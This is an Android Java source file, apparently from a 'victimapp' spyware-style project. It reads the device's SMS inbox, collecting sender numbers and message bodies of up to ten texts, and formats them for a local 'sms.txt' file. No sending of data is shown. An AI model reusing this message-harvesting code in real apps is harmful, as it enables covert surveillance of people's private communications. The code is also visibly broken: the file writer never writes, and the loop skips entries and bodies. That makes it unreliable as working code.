package com.example.victimapp;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;

import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class SMS {


    //taken from here: https://stackoverflow.com/questions/18353734/getting-all-sms-from-an-android-phone
    public static List<com.example.victimapp.Pair> getSMS(Activity activity) {
        List<com.example.victimapp.Pair> sms = new ArrayList<com.example.victimapp.Pair>();
        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur = activity.getContentResolver().query(uriSMSURI, null, null, null, null);
        int countofsms=0;
        while (cur != null && cur.moveToNext()&&countofsms<10) {
            String address = cur.getString(cur.getColumnIndex("address"));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            com.example.victimapp.Pair addressAndBody = new com.example.victimapp.Pair(address, body);
            sms.add(addressAndBody);
            countofsms++;
//            sms.add("Number: " + address + " .Message: " + body);
        }

        if (cur != null) {
            cur.close();
        }
        Collections.sort(sms);
        return sms;
    }
    
    public static void turnSmsListToTextFile(List<com.example.victimapp.Pair> smsList) throws FileNotFoundException, UnsupportedEncodingException {
        PrintWriter writer = new PrintWriter("sms.txt");
        String temp=smsList.get(0).getAddress(), str="Number"+temp+"\n"+"Body"+smsList.get(0).getBody();
        for (int i = 1; i < smsList.size() - 1; i++) {
            if( temp.equals(smsList.get(i).getAddress()))
                str+=smsList.get(i).getBody()+"\n \n";
            else{
                temp=smsList.get(i).getAddress();
                str+="\n Number: "+temp+"\n Body:";
            }
        }
    }
}


